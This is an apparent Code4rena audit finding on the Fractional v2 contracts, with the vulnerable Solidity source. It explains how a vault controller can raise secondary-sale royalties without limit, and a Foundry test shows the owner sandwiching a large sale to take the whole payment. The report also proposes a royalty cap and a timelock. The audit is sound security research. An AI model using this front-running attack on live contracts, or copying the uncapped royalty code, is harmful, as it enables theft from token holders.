{
  "Title": "[M-03] A vault owner can also be the controller and arbitraily set the secondary market royalties",
  "Content": "_Submitted by 0xNineDec, also found by Franfran, neumo, oyc&#95;109, pashov, and Ruhum_\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L147>\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217>\n\n### Impact\n\nThe secondary sales of a specific `FERC1155` token can be charged with a certain amount of fees established by the controller of the `FERC1155`. Those royalties are meant to be sent to a receiver according to the current implementation. Currently the protocol intends users to deploy vaults via `BaseVault.deployVault()` which further calls `VaultRegistry.create()`  that uses the currently deployed `fNFT` instance which it is controlled by the protocol itself.\n\nHowever, there is other path that allows users deploying a vault where they are also the controllers of the `fNFT` instance. This allows users to take control over how are the royalty fees changed. A user can easily change maliciously the amount of royalties (which are also uncapped) and steal a considerable (even the whole) amount of `FERC1155` transferred.\n\n### Proof of Concept\n\nIn order to illustrate this, we will conduct a hypothetical scenario where Alice is a malicious vault owner that deploys her vault by directly calling `VaultRegistry.createCollectionFor()`, bypassing the need to call `BaseVault.deployVault()`.\n\n*   Alice creates a vault to fractionalize a pricy asset with the `_merkleRoot` containing the `Minter` module by calling `VaultRegistry.createCollectionFor()`. She is now owner of `Token`.\n*   She mints an amount of `fTokens` and starts to distribute them among the community, and calls `Token.setRoyalties()` setting the royalties for the secondary market at 1% (in order to incentivize and grow a secondary market).\n*   A few periods later once the secondary market of that token acquired considerable momentum, Alice scans the mempool and decides to frontrun Bob (who was performing a big transfer) and steals the 100% of payment.\n\nAs a result of this process, Bob transferred the token to the buyer and received no payment in exchange and Alice got her hands on the whole payment.\n\nIt is showcased on the following code that Alice has control over how the fees are modified and when.\n\n        function test_CanFrontrunRoyalties() public {\n            (vault, token) = alice.registry.createCollectionFor(\n                merkleRoot,\n                alice.addr,\n                nftReceiverPlugins,\n                nftReceiverSelectors\n            );\n\n            assertEq(IVault(vault).owner(), address(registry));\n            assertEq(IFERC1155(token).controller(), alice.addr);\n            \n            // Supposing that Alice added herself a minter permission within the merkleRoot\n            // that allows her to call Supply.mint(), she will be able to mint tokens.\n\n            // A few days pass and now the tokens are distributed across the community.\n            uint256 currentId = 1; // Supposed assigned tokenId.\n            uint256 maxPercentage = 100;\n            uint256 initialPercentage = 1;\n\n            // Initially Alice sets royalties at 1% in order to incentive secondary market.\n            vm.prank(alice.addr);\n            IFERC1155(token).setRoyalties(currentId, alice.addr, initialPercentage);\n\n            // Check that anyone but Alice can change the royalties.\n            vm.startPrank(bob.addr);\n            vm.expectRevert(\n                abi.encodeWithSelector(\n                    IFERC1155.InvalidSender.selector,\n                    alice.addr, \n                    bob.addr\n                )\n            );    \n            IFERC1155(token).setRoyalties(currentId, bob.addr, maxPercentage);     \n            vm.stopPrank();\n\n            // Here is where the attack starts.\n            vm.startPrank(alice.addr);\n            // Frontruns a big transaction (in terms of ether counterpart).\n            IFERC1155(token).setRoyalties(currentId, alice.addr, maxPercentage);\n            uint256 salePriceInEther = 100 ether;\n\n            (address royaltyReceiver, uint256 calculatedRoyalties) = IFERC1155(token).royaltyInfo(currentId, salePriceInEther);\n            assertEq(royaltyReceiver, alice.addr);\n            assertEq(calculatedRoyalties, salePriceInEther * maxPercentage / 100);\n\n            // TX <====== sandwitched attacked transaction is mined\n\n            // Backruns taking back the royalties to what it was initially.\n            IFERC1155(token).setRoyalties(currentId, alice.addr, initialPercentage);\n            (royaltyReceiver, calculatedRoyalties) = IFERC1155(token).royaltyInfo(currentId, salePriceInEther);\n            assertEq(royaltyReceiver, alice.addr);\n            assertEq(calculatedRoyalties, salePriceInEther * initialPercentage / 100);\n            vm.stopPrank();\n        }\n\n### Recommended Mitigation Steps\n\nIt is needed to define clearly how users are intended to deploy vaults under which privileges. The fact that a user can deploy a vault both from `BaseVault` and `VaultRegistry` having different privileges is an issue. If needed, the `VaultRegistry` key functions can be set as internal and have specific callers within `BaseVault` that control also the privileges of each creation in order to concentrate the vault creations within a single endpoint.\n\nAlso, it is extremely important to set a maximum cap for the royalties as soon as possible. Although this does not mitigate the fact that a malicious vault owner can frontrun others, it gives a maximum boundary. What will be a definitive solution is setting both a maximum cap for the royalties and timelock that function so that vault owners have to wait a certain amount of time before changing the royalties in order to bring predictability for the community.\n\n**[aklatham (Fractional) disagreed with severity](https://github.com/code-423n4/2022-07-fractional-findings/issues/166)**\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-fractional-findings/issues/166#issuecomment-1214473357):**\n > Royalties can be set to any rate by the owner, resulting in an effective loss for users. I think this is a Medium risk because it requires a malicious owner to set an unreasonable value.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-07-fractional-v2-contest",
  "Code": [
    {
      "filename": "src/VaultRegistry.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {ClonesWithImmutableArgs} from \"clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\";\nimport {FERC1155} from \"./FERC1155.sol\";\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {IVaultRegistry, VaultInfo} from \"./interfaces/IVaultRegistry.sol\";\nimport {VaultFactory} from \"./VaultFactory.sol\";\n\n/// @title Vault Registry\n/// @author Fractional Art\n/// @notice Registry contract for tracking all fractional vaults\ncontract VaultRegistry is IVaultRegistry {\n    /// @dev Use clones library with address types\n    using ClonesWithImmutableArgs for address;\n    /// @notice Address of VaultFactory contract\n    address public immutable factory;\n    /// @notice Address of FERC1155 token contract\n    address public immutable fNFT;\n    /// @notice Address of Implementation for FERC1155 token contract\n    address public immutable fNFTImplementation;\n    /// @notice Mapping of collection address to next token ID type\n    mapping(address => uint256) public nextId;\n    /// @notice Mapping of vault address to vault information\n    mapping(address => VaultInfo) public vaultToToken;\n\n    /// @notice Initializes factory, implementation, and token contracts\n    constructor() {\n        factory = address(new VaultFactory());\n        fNFTImplementation = address(new FERC1155());\n        fNFT = fNFTImplementation.clone(\n            abi.encodePacked(msg.sender, address(this))\n        );\n    }\n\n    /// @notice Burns vault tokens\n    /// @param _from Source address\n    /// @param _value Amount of tokens\n    function burn(address _from, uint256 _value) external {\n        VaultInfo memory info = vaultToToken[msg.sender];\n        uint256 id = info.id;\n        if (id == 0) revert UnregisteredVault(msg.sender);\n        FERC1155(info.token).burn(_from, id, _value);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function create(\n        bytes32 _merkleRoot,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins, and transfers ownership to a given owner\n    /// @dev This should only be done in limited cases i.e. if you're okay with a trusted individual(s)\n    /// having control over the vault. Ideally, execution would be locked behind a Multisig wallet.\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _owner Address of the vault owner\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function createFor(\n        bytes32 _merkleRoot,\n        address _owner,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);\n        IVault(vault).transferOwnership(_owner);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for the message sender\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    /// @return token Address of FERC1155 contract\n    function createCollection(\n        bytes32 _merkleRoot,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault, address token) {\n        (vault, token) = createCollectionFor(\n            _merkleRoot,\n            msg.sender,\n            _plugins,\n            _selectors\n        );\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for an existing collection\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _token Address of FERC1155 contract\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function createInCollection(\n        bytes32 _merkleRoot,\n        address _token,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) external returns (address vault) {\n        address controller = FERC1155(_token).controller();\n        if (controller != msg.sender)\n            revert InvalidController(controller, msg.sender);\n        vault = _deployVault(_merkleRoot, _token, _plugins, _selectors);\n    }\n\n    /// @notice Mints vault tokens\n    /// @param _to Target address\n    /// @param _value Amount of tokens\n    function mint(address _to, uint256 _value) external {\n        VaultInfo memory info = vaultToToken[msg.sender];\n        uint256 id = info.id;\n        if (id == 0) revert UnregisteredVault(msg.sender);\n        FERC1155(info.token).mint(_to, id, _value, \"\");\n    }\n\n    /// @notice Gets the total supply for a token and ID associated with a vault\n    /// @param _vault Address of the vault\n    /// @return Total supply\n    function totalSupply(address _vault) external view returns (uint256) {\n        VaultInfo memory info = vaultToToken[_vault];\n        return FERC1155(info.token).totalSupply(info.id);\n    }\n\n    /// @notice Gets the uri for a given token and ID associated with a vault\n    /// @param _vault Address of the vault\n    /// @return URI of token\n    function uri(address _vault) external view returns (string memory) {\n        VaultInfo memory info = vaultToToken[_vault];\n        return FERC1155(info.token).uri(info.id);\n    }\n\n    /// @notice Creates a new vault with permissions and plugins for a given controller\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _controller Address of token controller\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    /// @return token Address of FERC1155 contract\n    function createCollectionFor(\n        bytes32 _merkleRoot,\n        address _controller,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) public returns (address vault, address token) {\n        token = fNFTImplementation.clone(\n            abi.encodePacked(_controller, address(this))\n        );\n        vault = _deployVault(_merkleRoot, token, _plugins, _selectors);\n    }\n\n    /// @dev Deploys new vault for specified token, sets merkle root, and installs plugins\n    /// @param _merkleRoot Hash of merkle root for vault permissions\n    /// @param _token Address of FERC1155 contract\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of function selectors\n    /// @return vault Address of Proxy contract\n    function _deployVault(\n        bytes32 _merkleRoot,\n        address _token,\n        address[] memory _plugins,\n        bytes4[] memory _selectors\n    ) private returns (address vault) {\n        vault = VaultFactory(factory).deploy();\n        vaultToToken[vault] = VaultInfo(_token, ++nextId[_token]);\n        IVault(vault).setMerkleRoot(_merkleRoot);\n        IVault(vault).install(_selectors, _plugins);\n\n        emit VaultDeployed(vault, _token, nextId[_token]);\n    }\n}"
    },
    {
      "filename": "src/FERC1155.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Clone} from \"clones-with-immutable-args/src/Clone.sol\";\nimport {ERC1155} from \"@rari-capital/solmate/src/tokens/ERC1155.sol\";\nimport {IFERC1155} from \"./interfaces/IFERC1155.sol\";\nimport {INFTReceiver} from \"./interfaces/INFTReceiver.sol\";\nimport \"./constants/Permit.sol\";\n\n/// @title FERC1155\n/// @author Fractional Art\n/// @notice An ERC-1155 implementation for Fractions\ncontract FERC1155 is Clone, ERC1155, IFERC1155 {\n    /// @notice Name of the token contract\n    string public constant NAME = \"FERC1155\";\n    /// @notice Version number of the token contract\n    string public constant VERSION = \"1\";\n    /// @notice Address that can deploy new vaults for this collection, manage metadata, etc\n    address internal _controller;\n    /// @notice URI of contract metadata\n    string public contractURI;\n    /// @notice Mapping of token type approvals owner => operator => tokenId => approved\n    mapping(address => mapping(address => mapping(uint256 => bool)))\n        public isApproved;\n    /// @notice Mapping of metadata contracts for token ID types => metadata address\n    mapping(uint256 => address) public metadata;\n    /// @notice Mapping to track account nonces for metadata txs owner => nonces\n    mapping(address => uint256) public nonces;\n    /// @notice Mapping to track total supply for token ID types => totalSupply\n    mapping(uint256 => uint256) public totalSupply;\n    /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress\n    mapping(uint256 => address) private royaltyAddress;\n    /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent\n    mapping(uint256 => uint256) private royaltyPercent;\n\n    /// @notice Modifier for restricting function calls to the controller account\n    modifier onlyController() {\n        address controller_ = controller();\n        if (msg.sender != controller_)\n            revert InvalidSender(controller_, msg.sender);\n        _;\n    }\n\n    /// @notice Modifier for restricting function calls to the VaultRegistry\n    modifier onlyRegistry() {\n        address vaultRegistry = VAULT_REGISTRY();\n        if (msg.sender != vaultRegistry)\n            revert InvalidSender(vaultRegistry, msg.sender);\n        _;\n    }\n\n    /// @notice Burns fractions for an ID\n    /// @param _from Address to burn fraction tokens from\n    /// @param _id Token ID to burn\n    /// @param _amount Number of tokens to burn\n    function burn(\n        address _from,\n        uint256 _id,\n        uint256 _amount\n    ) external onlyRegistry {\n        _burn(_from, _id, _amount);\n        totalSupply[_id] -= _amount;\n    }\n\n    /// @notice Hook to emit the URI update when setting the metadata or updating\n    /// @param _id Token ID metadata was updated for\n    /// @param _uri URI of metadata\n    function emitSetURI(uint256 _id, string memory _uri) external {\n        if (msg.sender != metadata[_id])\n            revert InvalidSender(metadata[_id], msg.sender);\n        emit URI(_uri, _id);\n    }\n\n    /// @notice Mints new fractions for an ID\n    /// @param _to Address to mint fraction tokens to\n    /// @param _id Token ID to mint\n    /// @param _amount Number of tokens to mint\n    /// @param _data Extra calldata to include in the mint\n    function mint(\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) external onlyRegistry {\n        _mint(_to, _id, _amount, _data);\n        totalSupply[_id] += _amount;\n    }\n\n    /// @notice Permit function that approves an operator for token type with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permit(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitStructHash(\n                _owner,\n                _operator,\n                _id,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApproved[_owner][_operator][_id] = _approved;\n\n        emit SingleApproval(_owner, _operator, _id, _approved);\n    }\n\n    /// @notice Permit function that approves an operator for all token types with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permitAll(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitAllStructHash(\n                _owner,\n                _operator,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApprovedForAll[_owner][_operator] = _approved;\n\n        emit ApprovalForAll(_owner, _operator, _approved);\n    }\n\n    /// @notice Scoped approvals allow us to eliminate some of the risks associated with setting the approval for an entire collection\n    /// @param _operator Address of spender account\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for operator(spender) account\n    function setApprovalFor(\n        address _operator,\n        uint256 _id,\n        bool _approved\n    ) external {\n        isApproved[msg.sender][_operator][_id] = _approved;\n\n        emit SingleApproval(msg.sender, _operator, _id, _approved);\n    }\n\n    /// @notice Sets the contract metadata\n    /// @param _uri URI of metadata\n    function setContractURI(string calldata _uri) external onlyController {\n        contractURI = _uri;\n    }\n\n    /// @notice Sets the token metadata contract\n    /// @param _metadata Address for metadata contract\n    /// @param _id Token ID to set the metadata for\n    function setMetadata(address _metadata, uint256 _id)\n        external\n        onlyController\n    {\n        metadata[_id] = _metadata;\n        emit SetMetadata(_metadata, _id);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _receiver Address to receive royalties\n    /// @param _percentage Percentage of royalties on secondary sales\n    function setRoyalties(\n        uint256 _id,\n        address _receiver,\n        uint256 _percentage\n    ) external onlyController {\n        royaltyAddress[_id] = _receiver;\n        royaltyPercent[_id] = _percentage;\n        emit SetRoyalty(_receiver, _id, _percentage);\n    }\n\n    /// @notice Updates the controller address for the FERC1155 token contract\n    /// @param _newController Address of new controlling entity\n    function transferController(address _newController)\n        external\n        onlyController\n    {\n        if (_newController == address(0)) revert ZeroAddress();\n        _controller = _newController;\n        emit ControllerTransferred(_newController);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _salePrice Sale price to calculate the royalty for\n    function royaltyInfo(uint256 _id, uint256 _salePrice)\n        external\n        view\n        returns (address receiver, uint256 royaltyAmount)\n    {\n        receiver = royaltyAddress[_id];\n        royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100;\n    }\n\n    /// @notice Transfer an amount of a token type between two accounts\n    /// @param _from Source address for an amount of tokens\n    /// @param _to Destination address for an amount of tokens\n    /// @param _id ID of the token type\n    /// @param _amount The amount of tokens being transferred\n    /// @param _data Additional calldata\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) public override(ERC1155, IFERC1155) {\n        require(\n            msg.sender == _from ||\n                isApprovedForAll[_from][msg.sender] ||\n                isApproved[_from][msg.sender][_id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        balanceOf[_from][_id] -= _amount;\n        balanceOf[_to][_id] += _amount;\n\n        emit TransferSingle(msg.sender, _from, _to, _id, _amount);\n\n        require(\n            _to.code.length == 0\n                ? _to != address(0)\n                : INFTReceiver(_to).onERC1155Received(\n                    msg.sender,\n                    _from,\n                    _id,\n                    _amount,\n                    _data\n                ) == INFTReceiver.onERC1155Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n\n    /// @notice Getter for URI of a token type\n    /// @param _id ID of the token type\n    function uri(uint256 _id)\n        public\n        view\n        override(ERC1155, IFERC1155)\n        returns (string memory)\n    {\n        require(metadata[_id] != address(0), \"NO METADATA\");\n        return IFERC1155(metadata[_id]).uri(_id);\n    }\n\n    /// @notice Getter for controller account\n    function controller() public view returns (address controllerAddress) {\n        _controller == address(0)\n            ? controllerAddress = INITIAL_CONTROLLER()\n            : controllerAddress = _controller;\n    }\n\n    /// @notice Getter for initial controller account immutable argument stored in calldata\n    function INITIAL_CONTROLLER() public pure returns (address) {\n        return _getArgAddress(0);\n    }\n\n    /// @notice VaultRegistry address that is allowed to call mint() and burn()\n    function VAULT_REGISTRY() public pure returns (address) {\n        return _getArgAddress(20);\n    }\n\n    /// @dev Computes hash of permit struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitStructHash(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _id,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes hash of permit all struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitAllStructHash(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_ALL_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes domain separator to prevent signature collisions\n    /// @return Hash of the contract-specific fields\n    function _computeDomainSeparator() internal view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(NAME)),\n                    keccak256(bytes(VERSION)),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /// @dev Computes digest of domain separator and struct hash\n    /// @param _domainSeparator Hash of contract-specific fields\n    /// @param _structHash Hash of signature fields struct\n    /// @return Hash of the signature digest\n    function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n}"
    }
  ]
}